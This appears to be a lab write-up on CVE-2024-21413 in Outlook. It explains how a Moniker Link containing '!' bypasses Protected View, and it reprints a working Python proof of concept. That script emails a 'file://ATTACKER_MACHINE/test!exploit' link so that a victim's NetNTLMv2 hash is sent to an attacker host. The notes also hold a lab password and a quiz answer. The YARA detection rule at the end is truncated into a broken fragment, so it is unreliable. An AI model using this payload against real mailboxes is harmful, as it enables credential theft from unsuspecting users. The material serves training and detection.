[CVE-2024-21413](https://www.cve.org/CVERecord?id=CVE-2024-21413)
- **9.8 CVSS Score** 
- Remote Code Execution & Credential Leak
This vulnerability bypasses Outlook's security mechanisms when handling a specific type of hyperlink known as a Moniker Link. This can be abused by sending an email that contains a malicious Moniker Link to a victim, resulting in Outlook sending the user's NTLM credentials to the attacker once the hyperlink is clicked.

The vulnerability is known to affect the following Office releases:

| **Release**                       | **Version**                                |
| --------------------------------- | ------------------------------------------ |
| Microsoft Office LTSC 2021        | affected from 19.0.0                       |
| Microsoft 365 Apps for Enterprise | affected from 16.0.1                       |
| Microsoft Office 2019             | affected from 16.0.1                       |
| Microsoft Office 2016             | affected from 16.0.0 before 16.0.5435.1001 |

Outlook can render emails as HTML. You may notice this being used by your favourite newsletters. Additionally, Outlook can parse hyperlinks such as HTTP and HTTPS. However, it can also open URLs specifying applications known as [Moniker Links](https://learn.microsoft.com/en-us/windows/win32/com/url-monikers). Normally, Outlook will prompt a security warning when external applications are triggered.


The pop-up is a result of Outlook's "protected view". Protected View opens emails containing attachments, hyperlinks and similar content in read-only mode, blocking things such as macros (especially from outside an organisation)

By using `file://` Moniker Link in our hyperlink, we can instruct Outlook to attempt to access a file, such as a file on a network share (`<a href="file://ATTACKER_IPa/test>Click Me</a>`) The SMB protocol is used, which involves using local credentials for authentication. 

owever, Outlook's "Protected View" catches and blocks this attempt.

```html
<p><a href="file://ATTACKER_MACHINE/test">Click me</a></p>
```

The vulnerability here exists by modifying our hyperlink to include the `!` special character and some text in our Moniker Link which results in bypassing Outlook’s Protected View. For example: `<a href="file://ATTACKER_IP/test!exploit>Click me</a>`.

```html
<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
```

We, as attackers, can provide a Moniker Link of this nature for the attack. Note the share does not need to exist on the remote device, as an authentication attempt will be attempted regardless, leading to the victim's Windows netNTLMv2 hash being sent to the attacker.

Remote Code Execution (RCE) is possible because Moniker Links uses the Component Object Model (COM) on Windows. However, explaining this is currently out of scope for this room, as there is no publicly released proof of concept for achieving RCE via this specific CVE.

---

For this attack, we will email our victim a Moniker Link similar to the one provided in the previous task. The objective, as the attacker, is to craft an email to the victim with a Moniker Link that bypasses Outlook's "Protected View", where the victim’s client will attempt to load a file from our attacking machine, resulting in the victim’s netNTLMv2 hash being captured.

But first, let’s run through a PoC I have created (which is also available on [GitHub](https://github.com/CMNatic/CVE-2024-21413)).

```python
'''
Author: CMNatic | https://github.com/cmnatic
Version: 1.0 | 19/02/2024
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
password = input("Enter your attacker email password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>

    </body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('MAILSERVER', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\n Email delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```


The PoC:

- Takes an attacker & victim email. Normally, you would need to use your own SMTP server (this has already been provided for you in this room)
- Requires the password to authenticate. For this room, the password for **attacker@monikerlink.thm** is **attacker**
- Contains the email content (html_content), which contains our Moniker Link as a HTML hyperlink
- Then, fill in the "subject", "from" and "to" fields in the email
- Finally, it sends the email to the mail server


Make sure to modify the Moniker link in the PoC to reflect the IP Address of our Attack Box

Replace the MAILSERVER placeholder on line #31 with ...............

The script will prompt you for the attacker email password, then will print `Email Delivered`.

- If the script complains about authentication failure, ensure you have correctly replaced the values in `exploit.py`


Q: *What type of hash is captured once the hyperlink in the email has been clicked?*
A: `NetNTLMv2`


## Detection
#### YARA
The following YARA rule was created to detect emails containing the `file://` element in the Moniker link:
```yara
user@yourmachine:# cat cve-2024-21413.yar 


rule EXPL_CVE_2024_21413_Microsoft_Outlook_RCE_Feb24 {

      and 1 of ($xr*)

}
```

### WireShark
Additionally the SMB request from the victim to the client can be seen in a packet capture with a truncated NetNTLMv2 hash
